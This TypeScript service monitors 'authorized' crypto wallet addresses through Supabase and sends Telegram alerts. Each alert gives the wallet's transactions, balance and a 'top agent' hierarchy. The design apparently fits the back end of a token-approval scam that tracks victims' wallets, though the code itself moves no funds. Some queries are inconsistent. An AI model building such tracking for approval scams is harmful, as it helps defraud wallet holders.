/**
 * 钱包动账监听服务
 * 监听授权成功的地址，当有资金转入转出时发送Telegram通知
 */

import { supabase } from '@/lib/supabase'
import { RealtimeChannel } from '@supabase/supabase-js'

// Telegram Bot配置
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || ''

interface WalletTransaction {
  id: number
  user_wallet_address: string
  transaction_type: 'in' | 'out'
  amount: string
  token: string
  tx_hash: string
  block_number: number
  timestamp: string
  from_wallet_address: string
  to_wallet_address: string
  is_processed: boolean
}

export class WalletMonitorService {
  private channel: RealtimeChannel | null = null
  private isRunning = false
  private monitoredAddresses = new Set<string>()

  /**
   * 启动钱包监听服务
   */
  async start() {
    if (this.isRunning) {
      console.log('钱包监听服务已在运行')
      return
    }

    // 检查Telegram配置
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn('Telegram配置缺失，跳过启动钱包监听服务')
      console.warn('请检查环境变量: TELEGRAM_BOT_TOKEN 和 TELEGRAM_CHAT_ID')
      return
    }

    console.log('启动钱包动账监听服务...')

    try {
      // 创建Realtime频道监听钱包交易表
      this.channel = supabase
        .channel('wallet-monitor')
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'wallet_transactions',
            filter: 'is_processed=eq.false'
          },
          async (payload) => {
            console.log('检测到新的钱包交易:', payload)
            await this.handleWalletTransaction(payload.new as WalletTransaction)
          }
        )
        .subscribe((status) => {
          if (status === 'SUBSCRIBED') {
            console.log('钱包动账监听服务已启动')
            this.isRunning = true
          } else if (status === 'CLOSED') {
            console.log('钱包监听连接已关闭')
            this.isRunning = false
          } else if (status === 'CHANNEL_ERROR') {
            console.error('钱包监听频道错误')
            this.isRunning = false
          } else if (status === 'TIMED_OUT') {
            console.error('钱包监听连接超时')
            this.isRunning = false
          } else {
            console.log('钱包监听状态:', status)
          }
        })

      console.log('正在监听 wallet_transactions 表的INSERT事件...')
      
    } catch (error) {
      console.error('启动钱包监听服务失败:', error)
      this.isRunning = false
    }
  }

  /**
   * 停止钱包监听服务
   */
  async stop() {
    if (!this.isRunning || !this.channel) {
      console.log('钱包监听服务未运行')
      return
    }

    console.log('停止钱包监听服务...')
    
    try {
      await supabase.removeChannel(this.channel)
      this.channel = null
      this.isRunning = false
      console.log('钱包监听服务已停止')
    } catch (error) {
      console.error('停止钱包监听服务失败:', error)
    }
  }

  /**
   * 添加监听地址
   */
  async addMonitoredAddress(wallet_address: string) {
    if (this.monitoredAddresses.has(wallet_address)) {
      console.log(`地址 ${wallet_address} 已在监听列表中`)
      return
    }

    this.monitoredAddresses.add(wallet_address)
    console.log(`✅ 已添加监听地址: ${wallet_address}`)

    // 将地址保存到数据库
    try {
      // 先查找用户ID
      const { data: userData, error: userError } = await supabase
        .from('nh_member_new')
        .select('id')
        .eq('wallet_address', wallet_address)
        .eq('is_active', true)
        .single()

      if (userError || !userData) {
        console.error(`❌ 查找用户失败: ${wallet_address}`, userError)
        return
      }

      const { error } = await supabase
        .from('wallet_monitor')
        .upsert({
          member_id: userData.id,
          wallet_address: wallet_address,
          is_active: true,
          monitor_transactions: true,
          created_at: new Date().toISOString()
        })

      if (error) {
        console.error('保存监听地址失败:', error)
      } else {
        console.log(`✅ 监听地址已保存到数据库: ${wallet_address}`)
      }
    } catch (error) {
      console.error('保存监听地址异常:', error)
    }
  }

  /**
   * 移除监听地址
   */
  async removeMonitoredAddress(wallet_address: string) {
    this.monitoredAddresses.delete(wallet_address)
    console.log(`❌ 已移除监听地址: ${wallet_address}`)

    // 从数据库标记为不活跃
    try {
      const { error } = await supabase
        .from('monitored_wallet_addresses')
        .update({
          is_active: false,
          updated_at: new Date().toISOString()
        })
        .eq('wallet_address', wallet_address)

      if (error) {
        console.error('更新监听地址状态失败:', error)
      } else {
        console.log(`✅ 监听地址状态已更新: ${wallet_address}`)
      }
    } catch (error) {
      console.error('更新监听地址状态异常:', error)
    }
  }

  /**
   * 处理钱包交易
   */
  private async handleWalletTransaction(transaction: WalletTransaction) {
    try {
      // 检查是否在监听列表中
      if (!this.monitoredAddresses.has(transaction.user_wallet_address)) {
        console.log(`地址 ${transaction.user_wallet_address} 不在监听列表中，跳过处理`)
        return
      }

      console.log(`💰 处理钱包交易: ${transaction.transaction_type} - ${transaction.amount} ${transaction.token}`)

      // 获取用户信息
      const userInfo = await this.getUserInfo(transaction.user_wallet_address)
      if (!userInfo) {
        console.error(`用户信息获取失败: ${transaction.user_wallet_address}`)
        return
      }

      // 构建通知消息
      const message = this.buildTransactionMessage(transaction, userInfo)

      // 发送Telegram通知
      const success = await this.sendTelegramMessage(message)

      // 更新交易处理状态
      await this.updateTransactionStatus(transaction.id, success)

    } catch (error) {
      console.error('处理钱包交易失败:', error)
      await this.updateTransactionStatus(transaction.id, false, error instanceof Error ? error.message : '未知错误')
    }
  }

  /**
   * 获取用户信息
   */
  private async getUserInfo(wallet_address: string) {
    try {
      const { data, error } = await supabase
        .from('nh_member_new')
        .select('id, wallet_address, auth_wallet_address, parent_id, agent_level, remark, is_effective')
        .eq('wallet_address', wallet_address)
        .eq('is_active', 0)
        .single()

      if (error || !data) {
        console.error('获取用户信息失败:', error)
        return null
      }

      // 获取顶层代理信息
      let topAgent = null
      if (data.parent_id) {
        const { data: agentData } = await supabase
          .from('nh_member_new')
          .select('id, wallet_address, auth_wallet_address, remark')
          .eq('id', data.parent_id)
          .single()
        
        topAgent = agentData
      }

      return {
        ...data,
        topAgent
      }
    } catch (error) {
      console.error('获取用户信息异常:', error)
      return null
    }
  }

  /**
   * 构建交易通知消息
   */
  private buildTransactionMessage(transaction: WalletTransaction, userInfo: any): string {
    const isIncoming = transaction.transaction_type === 'in'
    const action = isIncoming ? '转入' : '转出'
    const orderAmount = isIncoming ? `${transaction.amount} ${transaction.token}` : '-'
    const time = isIncoming ? '注册时间' : '授权时间'
    const timeValue = new Date(transaction.timestamp).toLocaleString('zh-CN')
    
    // 获取钱包余额（这里需要调用API获取实际余额）
    const walletBalance = '0' // 实际实现中需要调用API获取

    return `
**钱包${action}通知**

**钱包余额：**${walletBalance}
**顶层代理：**${userInfo.topAgent?.auth_wallet_address || '无'}
**代理昵称：**${userInfo.topAgent?.remark || '无'}
**用户编号：**${userInfo.id}
**用户备注：**${userInfo.remark || 'null'}
**是否活动：**${userInfo.is_effective ? '是' : '否'}
**用户钱包：**${transaction.user_wallet_address}
**订单金额：**${orderAmount}
**${time}：**${timeValue}
**交易对象：**${isIncoming ? transaction.from_wallet_address : transaction.to_wallet_address}
**执行操作：**客户${action}
    `.trim()
  }

  /**
   * 发送Telegram消息
   */
  private async sendTelegramMessage(message: string): Promise<boolean> {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn('Telegram配置缺失，跳过发送')
      return false
    }

    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      })

      const result = await response.json()

      if (result.ok) {
        console.log('钱包交易Telegram通知发送成功')
        return true
      } else {
        console.error('钱包交易Telegram通知发送失败:', result)
        return false
      }
    } catch (error) {
      console.error('发送钱包交易Telegram通知异常:', error)
      return false
    }
  }

  /**
   * 更新交易处理状态
   */
  private async updateTransactionStatus(
    transactionId: number,
    success: boolean,
    errorMessage?: string
  ) {
    try {
      const { error } = await supabase
        .from('wallet_transactions')
        .update({
          is_processed: true,
          processed_at: new Date().toISOString(),
          notification_sent: success,
          error_message: errorMessage || null
        })
        .eq('id', transactionId)

      if (error) {
        console.error('更新交易状态失败:', error)
      } else {
        console.log(`交易状态已更新: ${success ? '成功' : '失败'}`)
      }
    } catch (error) {
      console.error('更新交易状态异常:', error)
    }
  }

  /**
   * 获取服务状态
   */
  getStatus() {
    return {
      isRunning: this.isRunning,
      channelActive: this.channel !== null,
      monitoredAddresses: Array.from(this.monitoredAddresses)
    }
  }
}

// 导出单例
export const walletMonitorService = new WalletMonitorService()






